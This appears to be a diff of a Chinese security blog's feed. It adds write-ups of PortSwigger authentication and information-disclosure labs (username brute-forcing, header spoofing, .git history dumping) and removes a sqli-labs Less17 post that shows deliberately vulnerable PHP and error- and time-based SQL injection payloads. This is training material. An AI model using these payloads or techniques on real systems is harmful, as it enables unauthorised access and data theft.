+<h3 id="0x01-Authentication"><a href="#0x01-Authentication" class="headerlink" title="0x01 Authentication"></a>0x01 Authentication</h3><p>该部分一共有14关卡，都是关于认证过程的方式和如何攻击的内容。</p>
+<p><img src="/portswigger-Authentication/image-20200801211842010.png" alt="image-20200801211842010"></p>
+<p>身份验证机制是网站最常见的功能部分，</p>
+<p>例如登录功能中的身份验证、敏感操作前的身份验证等等场景，</p>
+<p>不同的身份验证机制有各自特定的漏洞。</p>
+<p> 一旦攻击者绕过身份验证到另一个用户的帐户中，</p>
+<p>就可以访问被攻击帐户所拥有的数据和功能。 </p>
+<p>1、身份验证漏洞的起因</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 暴力攻击</span><br><span class="line">2. 逻辑缺陷</span><br><span class="line">3. 编码绕过</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、身份验证漏洞的类型</p>
+<p> 网站的身份验证系统通常由几种可能发生漏洞的不同机制组成。 </p>
+<p>在portswigger靶场中一共有三类常见漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 密码类</span><br><span class="line">2. 多因素身份验证类</span><br><span class="line">3. 其他身份验证类</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-第一关"><a href="#0x02-第一关" class="headerlink" title="0x02 第一关"></a>0x02 第一关</h3><p>Username enumeration via different responses</p>
+<p><img src="/portswigger-Authentication/image-20200804131256385.png" alt="image-20200804131256385"></p>
+<p>1、解释：该关卡是通过不同的响应信息来枚举账户。</p>
+<p>2、过程：</p>
+<p>进入靶场关卡、可以发现提供了home目录和账户登录功能</p>
+<p><img src="/portswigger-Authentication/image-20200804131654302.png" alt="image-20200804131654302"></p>
+<p>点击登录功能</p>
+<p><img src="/portswigger-Authentication/image-20200804131833824.png" alt="image-20200804131833824"></p>
+<p>随手输入一个弱账户admin/admin,可以看到返回了 <strong>Invalid username</strong> </p>
+<p><img src="/portswigger-Authentication/image-20200804131927038.png" alt="image-20200804131927038"></p>
+<p>从这个信息可以猜测，在该站点的登录功能过程中，首先是校验是否存在该用户，如果存在该账户，接着再校验账户的密码。那么接下来就说先爆破用户了</p>
+<p>由于这个靶场是考察burpsuite的使用技巧，所以就不上自己的字典了，使用burpsuite自带的字典，把用户和密码字典的加载进来</p>
+<p><img src="/portswigger-Authentication/image-20200804132559728.png" alt="image-20200804132559728"></p>
+<p>在爆破过程中，点击数据包长度排序，过不久就get到有效的用户名Administrator，</p>
+<p>同时也返回了关键信息 <strong>Invalid password</strong></p>
+<p><img src="/portswigger-Authentication/image-20200804133119388.png" alt="image-20200804133119388"></p>
+<p>用户名get it，接着再继续爆破密码</p>
+<p>3、回顾：</p>
+<h3 id="0x03-第二关"><a href="#0x03-第二关" class="headerlink" title="0x03 第二关"></a>0x03 第二关</h3><h3 id="0x04-第三关"><a href="#0x04-第三关" class="headerlink" title="0x04 第三关"></a>0x04 第三关</h3><h3 id="0x05-第四关"><a href="#0x05-第四关" class="headerlink" title="0x05 第四关"></a>0x05 第四关</h3><h3 id="0x06-第五关"><a href="#0x06-第五关" class="headerlink" title="0x06 第五关"></a>0x06 第五关</h3><h3 id="0x07-第六关"><a href="#0x07-第六关" class="headerlink" title="0x07 第六关"></a>0x07 第六关</h3><h3 id="0x08-第七关"><a href="#0x08-第七关" class="headerlink" title="0x08 第七关"></a>0x08 第七关</h3>]]></content>
+  </entry>
+  <entry>
+    <title>portswigger-information-disclosure</title>
+    <url>/portswigger-information-disclosure/</url>
+    <content><![CDATA[<h1 id="portswigger-Information-disclosure"><a href="#portswigger-Information-disclosure" class="headerlink" title="portswigger-Information-disclosure"></a>portswigger-Information-disclosure</h1><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>前几天在i春秋论坛上看到两篇关于burpsuite的文章：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57859&amp;highlight=burpsuite</span><br><span class="line">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57938&amp;highlight=burpsuite</span><br></pre></td></tr></table></figure>
+
+<p>文章中的师傅推荐了<strong>portswigger</strong>这个靶场，一个关于burpsuite的靶场。</p>
+<p>昨天吃饭的时候，无意间又发现了i春秋公众号关于这个靶场的推文介绍。</p>
+<p>晚上回来看看，发现感觉还不错，于是有了这篇文章。</p>
+<p>接下来几天，希望能写一个系列关于该靶场的关卡过程。</p>
+<h3 id="0x02-介绍"><a href="#0x02-介绍" class="headerlink" title="0x02 介绍"></a>0x02 介绍</h3><p><img src="/portswigger-information-disclosure/image-20200728214145203.png" alt="image-20200728214145203"></p>
+<p>portswigger，一个关于burpsuite的地方，burpsuite对于web安全的重要性不言而喻。</p>
+<p>第一部分是关于Information disclosure的内容，Information disclosure，也就是信息泄露。</p>
+<h3 id="0x03-Information-disclosure-in-error-messages"><a href="#0x03-Information-disclosure-in-error-messages" class="headerlink" title="0x03 Information disclosure in error messages"></a>0x03 Information disclosure in error messages</h3><p>第一关，在错误信息中泄露的信息</p>
+<p><img src="/portswigger-information-disclosure/image-20200728214811850.png" alt="image-20200728214811850"></p>
+<p>该关卡的大概意思是在错误信息中找到该站所使用的第三方框架，并提交其版本号</p>
+<p>进入该站，发现这是一个商品购买的网站，主页上展示了各类商品</p>
+<p><img src="/portswigger-information-disclosure/image-20200728215332374.png" alt="image-20200728215332374"></p>
+<p>点进一款商品，是关于该产品的详细介绍内容展示</p>
+<p><img src="/portswigger-information-disclosure/image-20200728215648965.png" alt="image-20200728215648965"></p>
+<p>明显地，这里详细内容介绍是通过GET传参，传递``productId=1`，来展示的，通过修改该id，即可展示不同的商品内容介绍</p>
+<p>结合题目意思，通过错误信息暴露出框架的版本号，那么将整数型的<code>productId</code>，修改为字符型，或者添加任意的字符，使其为非整数型的数据，即可暴露出框架的版本号</p>
+<p><img src="/portswigger-information-disclosure/image-20200728220238759.png" alt="image-20200728220238759"></p>
+<p>该网站使用了<code>Apache Struts 2 2.3.31</code></p>
+<h3 id="0x04-Information-disclosure-on-debug-page"><a href="#0x04-Information-disclosure-on-debug-page" class="headerlink" title="0x04 Information disclosure on debug page"></a>0x04 Information disclosure on debug page</h3><p>第二关，在debug中泄露信息</p>
+<p><img src="/portswigger-information-disclosure/image-20200728221824056.png" alt="image-20200728221824056"></p>
+<p>该关卡中，网站存在一个调试页面，该调试页面会暴露出敏感信息，找到该页面后，提交一个叫<code>SECRET_KEY</code>的环境变量</p>
+<p>进入关卡，发现还是类似原来的那个网站，不过报错的地方已经修复好了</p>
+<p><img src="/portswigger-information-disclosure/image-20200728222411737.png" alt="image-20200728222411737"></p>
+<p>由于被第一关影响，这里卡了一下，跑去找<code>Apache Struts 2 2.3.31</code>的debug调试方式，</p>
+<p>结果试了n久，发现没啥收获，后来回想，<strong>调试页面</strong>???</p>
+<p>于是，上burpsuite，对站点进行爬取，发现了存在一个<code>phpinfo.php</code>，顺着找到了答案</p>
+<p><img src="/portswigger-information-disclosure/image-20200728222805076.png" alt="image-20200728222805076"></p>
+<p>搜索一下key</p>
+<p><img src="/portswigger-information-disclosure/image-20200728222836901.png" alt="image-20200728222836901"></p>
+<h3 id="0x05-Source-code-disclosure-via-backup-files"><a href="#0x05-Source-code-disclosure-via-backup-files" class="headerlink" title="0x05 Source code disclosure via backup files"></a>0x05 Source code disclosure via backup files</h3><p>第三关是通过备份文件泄露信息</p>
+<p><img src="/portswigger-information-disclosure/image-20200728223444622.png" alt="image-20200728223444622"></p>
+<p>该关卡，需要找到泄露的备份文件中的代码里面的<code>hard-coded</code></p>
+<p>进入网站</p>
+<p><img src="/portswigger-information-disclosure/image-20200728223725502.png" alt="image-20200728223725502"></p>
+<p>利用burpsuite，爬取网站页面</p>
+<p>robots.txt中还给了提示</p>
+<p><img src="/portswigger-information-disclosure/image-20200728223908543.png" alt="image-20200728223908543"></p>
+<p>robots.txt到backup</p>
+<p><img src="/portswigger-information-disclosure/image-20200728223932683.png" alt="image-20200728223932683"></p>
+<p>backup到ProductTemplate.java.bak，在该份文件中，存在postgresql的连接信息、目标和SQL语句</p>
+<p><img src="/portswigger-information-disclosure/image-20200728224110246.png" alt="image-20200728224110246"></p>
+<h3 id="0x06-Authentication-bypass-via-information-disclosure"><a href="#0x06-Authentication-bypass-via-information-disclosure" class="headerlink" title="0x06 Authentication bypass via information disclosure"></a>0x06 Authentication bypass via information disclosure</h3><p>第四关是通过公开的信息绕过认证</p>
+<p><img src="/portswigger-information-disclosure/image-20200729093053786.png" alt="image-20200729093053786"></p>
+<p>这关大概意思就是给出了一个普通用户<code>wiener:peter</code>，需要以具有管理权限的用户去管理界面删除<code>Carlos</code>用户，而绕过的提示是在HTTP的头部信息</p>
+<p>进入站点，通过利用burpsuite截取数据包</p>
+<p><img src="/portswigger-information-disclosure/image-20200729093453722.png" alt="image-20200729093453722"></p>
+<p>利用burpsuite爬取网站目录，发现了<code>/admin</code>，</p>
+<p>根据站点标题和fuzz出来的信息，可以知道这里就是需要绕过地方了</p>
+<p><img src="/portswigger-information-disclosure/image-20200729093620227.png" alt="image-20200729093620227"></p>
+<p>正常访问该页面，给出了提示，需要以管理员身份登录或以localhost身份请求才能进入管理界面</p>
+<p><img src="/portswigger-information-disclosure/image-20200729093803771.png" alt="image-20200729093803771"></p>
+<p>遇到这里，CTF的想法，马上安排了<code>X-Forwarded-For</code>,结果遇到了401</p>
+<p><img src="/portswigger-information-disclosure/image-20200729094525901.png" alt="image-20200729094525901"></p>
+<p>这里需要提一下，一个叫<strong>远程WWW服务支持TRACE请求</strong> 的漏洞，该漏洞就是TRACE请求导致的（详细见参考）</p>
+<p>在HTTP请求方法中，TRACE是定义的一种协议调试方法，其会使服务器原样返回任意客户端请求的任何内容。</p>
+<p>参见菜鸟教程中对HTTP请求的介绍：</p>
+<p><img src="/portswigger-information-disclosure/image-20200729095347735.png" alt="image-20200729095347735"></p>
+<p>基于探测网站可支持的HTTP方法，可以用<code>wfuzz</code>来检测</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ url</span><br></pre></td></tr></table></figure>
+
+<p><img src="/portswigger-information-disclosure/image-20200729100236047.png" alt="image-20200729100236047"></p>
+<p>可以看到其允许<code>TRACE</code>方法进行访问探测</p>
+<p><img src="/portswigger-information-disclosure/image-20200729100835204.png" alt="image-20200729100835204"></p>
+<p>出现了一个叫<code>X-Custom-IP-Authorization</code>的字段，想来这里就是需要伪造的位置了</p>
+<p>伪造后的结果如下</p>
+<p><img src="/portswigger-information-disclosure/image-20200729101042366.png" alt="image-20200729101042366"></p>
+<p>接下来burpsuite的操作就是截取数据包，在每次请求的时候，添加该字段参数和数值</p>
+<p>然后再去访问页面，删除<code>carlos</code>账户即可</p>
+<p><img src="/portswigger-information-disclosure/image-20200729101348132.png" alt="image-20200729101348132"></p>
+<p>拦截请求</p>
+<p><img src="/portswigger-information-disclosure/image-20200729101505006.png" alt="image-20200729101505006"></p>
+<p>点击删除后放行请求，成功删除</p>
+<p><img src="/portswigger-information-disclosure/image-20200729101545155.png" alt="image-20200729101545155"></p>
+<h3 id="0x07-Information-disclosure-in-version-control-history"><a href="#0x07-Information-disclosure-in-version-control-history" class="headerlink" title="0x07 Information disclosure in version control history"></a>0x07 Information disclosure in version control history</h3><p>最后一关是版本控制的历史记录导致的信息泄露</p>
+<p><img src="/portswigger-information-disclosure/image-20200729102003256.png" alt="image-20200729102003256"></p>
+<p>关卡要求通过历史记录，找到<code>administrator</code>的密码，然后登录删除<code>Carlos</code>账户</p>
+<p>版本控制的历史记录泄露，要么是git，要么是svn，利用两个CTF的小工具探测</p>
+<p><img src="/portswigger-information-disclosure/image-20200729102754870.png" alt="image-20200729102754870"></p>
+<p>找到密码<code>ADMIN_PASSWORD</code></p>
+<p><img src="/portswigger-information-disclosure/image-20200729103001025.png" alt="image-20200729103001025"></p>
+<p>然而在登录时候，发现验证失败</p>
+<p><img src="/portswigger-information-disclosure/image-20200729103824613.png" alt="image-20200729103824613"></p>
+<p>回想了一下，通过<strong>历史记录</strong>???，那就需要下载然后还原了</p>
+<p><img src="/portswigger-information-disclosure/image-20200729103925659.png" alt="image-20200729103925659"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://acb21f011e83991a804a4ee0008100c1.web-security-academy.net/.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="/portswigger-information-disclosure/image-20200729104343529.png" alt="image-20200729104343529"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status</span><br><span class="line">git reset --hard HEAD</span><br><span class="line">git log</span><br><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/portswigger-information-disclosure/image-20200729105324284.png" alt="image-20200729105324284"></p>
+<p>恢复到上一个历史版本才找到真正的密码<code>hh7zzmup7k564zbeqpwg</code></p>
+<p><img src="/portswigger-information-disclosure/image-20200729105543646.png" alt="image-20200729105543646"></p>
+<p>最后，利用<code>administrator/hh7zzmup7k564zbeqpwg</code>登录，删除用户</p>
+<p><img src="/portswigger-information-disclosure/image-20200729105746477.png" alt="image-20200729105746477"></p>
+<h3 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h3><p>除了前面的信息泄露关卡外，之前对于<strong>泄露</strong>做了一部分总结，这里引用一下</p>
+<h5 id="一、分类"><a href="#一、分类" class="headerlink" title="一、分类"></a>一、分类</h5><p>1、编辑器异常后产生的备份文件导致的信息泄露</p>
+<p>2、建站过程的压缩包忘记删除导致的信息泄露</p>
+<p>3、主要针对SVN和git的版本管理器使用不当导致的信息泄露</p>
+<p>4、标志性旗帜暴露导致网站cms或框架版本泄露</p>
+<h5 id="二、编辑器类"><a href="#二、编辑器类" class="headerlink" title="二、编辑器类"></a>二、编辑器类</h5><p>各种编辑器在异常情况下，例如突然关闭时，其会产生一个备份文件，</p>
+<p>对当前代码文件状态进行保存，避免丢失和方便下次打开，</p>
+<p>或者如vim的swp交换文件等。</p>
+<h5 id="三、备份文件类"><a href="#三、备份文件类" class="headerlink" title="三、备份文件类"></a>三、备份文件类</h5><p>当在打包代码进行建站的时候，如果管理员不注意，</p>
+<p>将异常情况下的产生的备份文件，打包到代码包内，</p>
+<p>进行建站的时候，就会造成在访问该备份文件的时候下载泄露。</p>
+<h5 id="四、版本管理器类"><a href="#四、版本管理器类" class="headerlink" title="四、版本管理器类"></a>四、版本管理器类</h5><p>1、漏洞</p>
+<p>开发人员使用SVN或git的版本控制软件，管理员使用SVN或者git进行版本控制</p>
+<p>或者在发布代码的时候直接copy代码包到服务器上直接进行部署。</p>
+<p>就会使得.svn或.git文件暴露在外网环境，导致代码泄露。</p>
+<p>2、攻击</p>
+<p>svnExploit：<code>https://github.com/admintony/svnExploit.git</code></p>
+<p>GitHack：<code>https://github.com/lijiejie/GitHack.git</code></p>
+<p>3、防御</p>
+<p>1）删除.svn或.git文件</p>
+<p>2）禁止使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替</p>
+<p>3）服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p>
+<p>五、cms或框架版本泄露</p>
+<p>如spring boot的小图标等</p>
+<p><img src="/portswigger-information-disclosure/image-20200729111125365.png" alt="image-20200729111125365"></p>
+<h3 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h3><p><a href="http://gljsfz.com/article.php?id=2196" target="_blank" rel="noopener">http://gljsfz.com/article.php?id=2196</a></p>
+<p><a href="https://www.jianshu.com/p/e7dd99b9f391" target="_blank" rel="noopener">https://www.jianshu.com/p/e7dd99b9f391</a></p>
+<p><a href="https://www.cnblogs.com/xiaodangshan/p/7715313.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaodangshan/p/7715313.html</a></p>
+<p><a href="https://www.runoob.com/http/http-methods.html" target="_blank" rel="noopener">https://www.runoob.com/http/http-methods.html</a></p>
+<p> <a href="https://github.com/RJ45mp/Wiki/wiki/代码泄露" target="_blank" rel="noopener">https://github.com/RJ45mp/Wiki/wiki/%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2</a> </p>
+<h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
+  </entry>
+  <entry>
     <title>pwn_deploy_chroot的搭建</title>
     <url>/pwn-deploy-chroot%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<p>pwn_deploy_chroot是一个部署pwn题，用于CTF的平台。<br><a href="http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/" target="_blank" rel="noopener">从大佬的博客可以知道该平台的特点如下：</a></p>
@@ -3661,47 +3734,6 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 ]]></content>
   </entry>
   <entry>
-    <title>由sqli-labs-Less17学习增删改形式下的sql注入</title>
-    <url>/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>mysql在对数据的处理中有增删改查四个操作。<br>而在sql注入中，往往常见的是<code>select</code>查询形式。<br>那么insert、delete、update呢？</p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>在ubuntu下搭建docker和开源vulstudy项目（其内含sqli-labs环境）。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br><span class="line">sudo apt-get install docker.io -y</span><br><span class="line">sudo apt-get docker-compose -y</span><br><span class="line">sudo apt-get git -y</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">git clone https://github.com/c0ny1/vulstudy.git</span><br><span class="line">cd /vulstudy/sqli-labs</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>1、增</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table_name(column_name1,column_name2)values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name set column_name1=&apos;value1&apos;,column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/1.png" alt><br>2、删</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from table_name where column_name=&apos;value&apos;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/2.png" alt><br>3、改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=&apos;value2&apos; where column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
-<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>sqli-labs-Less17代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">//making sure uname is not injectable</span><br><span class="line">$uname=check_input($_POST[&apos;uname&apos;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);</span><br><span class="line">fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">//echo $row;</span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		//echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;</span><br><span class="line">		$row1 = $row[&apos;username&apos;];  	</span><br><span class="line">		//echo &apos;Your Login name:&apos;. $row1;</span><br><span class="line">		$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br><span class="line">		mysql_query($update);</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">		if (mysql_error())</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			//echo &quot; You password has been successfully updated &quot; ;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&apos;;</span><br><span class="line">		//echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">  	&#125;</span><br><span class="line">	else  </span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">		//echo &quot;Bug off you Silly Dumb hacker&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&apos;;</span><br><span class="line"></span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>1、代码审计：<br>使用check_input函数对输入数据进行过滤，<br>接着以用户名作为条件查询数据库，<br>当查询到数据库存在记录时，更新该密码。<br>这是一个密码重置功能的代码。<br>然而在对输入数据进行过滤的过程中，清洗了用户名，却没有清洗密码，<br>由此导致了sql注入。</p>
-<p>2、check_input函数功能：<br>截取输入的数据中前15个字符，<br>检测服务端是否开启<code>magic_quotes_gpc</code>转义，如果有则删除反斜杠，<br>检测字符串中是否都是数字字符，如果不存在则对特定添加反斜杠，同时以单引号闭合数据，<br>如果都是数字字符，则将其转化为整数。</p>
-<p>3、函数解释：<br>get_magic_quotes_gpc()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/4.png" alt></p>
-<p>stripslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/5.png" alt></p>
-<p>ctype_digit()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
-<p>mysql_real_escape_string()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/7.png" alt></p>
-<p>intval()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/8.png" alt></p>
-<p>addslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/9.png" alt></p>
-<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>在注入点位置的报错注入与延时注入：<br>没有数据回显<del>联合注入取消</del>，没有布尔回显<del>布尔盲注取消</del></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/10.png" alt><br>1、报错注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and updatexml(1,(concat(0x7e,(select database()),0x7e)),1)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/11.png" alt><br>2、延时盲注</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and if((ord(left((select database()),1))=ascii(&apos;s&apos;)),sleep(1),0)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-<p>payload自行调整。</p>
-<h1 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h1><p>上述为update下的注入。<br>由于update、insert和delete三者应用场景的特殊性，<br>一般不会有数据回显，故一般选取布尔注入和延时注入。<br>1、insert下的注入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">insert into Rj45(id,word)values(3,updatexml(1,(concat(0x7e,(select database()),0x7e)),1));</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/12.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入：</span><br><span class="line">insert into Rj45(id,word)values(5,if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0));</span><br></pre></td></tr></table></figure>
